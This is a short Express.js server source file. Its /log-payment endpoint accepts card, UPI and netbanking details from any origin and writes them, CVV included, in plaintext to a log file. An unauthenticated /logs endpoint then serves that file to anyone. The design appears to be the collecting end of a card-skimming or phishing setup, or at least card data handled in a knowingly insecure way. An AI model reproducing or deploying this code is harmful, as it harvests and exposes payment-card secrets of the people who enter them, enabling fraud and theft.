const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const LOG_FILE = path.join(__dirname, 'payment_logs.txt');

// Ensure log file exists
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, '=== PAYMENT LOGS STARTED ===\n\n');
}

app.post('/log-payment', (req, res) => {
  const data = req.body;
  const timestamp = new Date().toISOString();

  let logEntry = `\n--- NEW PAYMENT [${timestamp}] ---\n`;
  logEntry += `Method     : ${data.method}\n`;
  logEntry += `Time       : ${data.time}\n`;

  if (data.method === 'card') {
    logEntry += `Card Name  : ${data.cardName || 'N/A'}\n`;
    logEntry += `Card Last4 : ${data.cardLast4 || 'XXXX'}\n`;
    logEntry += `Expiry     : ${data.cardExp || 'N/A'}\n`;
    logEntry += `CVV        : ${data.cardCvv || 'N/A'}\n`;
  } 
  else if (data.method === 'upi') {
    logEntry += `UPI ID     : ${data.upiId || 'N/A'}\n`;
  } 
  else if (data.method === 'netbanking') {
    logEntry += `Bank       : ${data.bank || 'Unknown'}\n`;
  }

  logEntry += `Amount     : ₹499\n`;
  logEntry += `----------------------------------------\n`;

  // Append to log file
  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) {
      console.error('Error writing log:', err);
      return res.status(500).json({ success: false });
    }
    console.log('Payment logged successfully');
  });

  res.json({ success: true });
});

app.get('/logs', (req, res) => {
  if (fs.existsSync(LOG_FILE)) {
    const logs = fs.readFileSync(LOG_FILE, 'utf8');
    res.type('text/plain').send(logs);
  } else {
    res.send('No logs yet.');
  }
});

app.listen(PORT, () => {
  console.log(`Logger server running on port ${PORT}`);
});
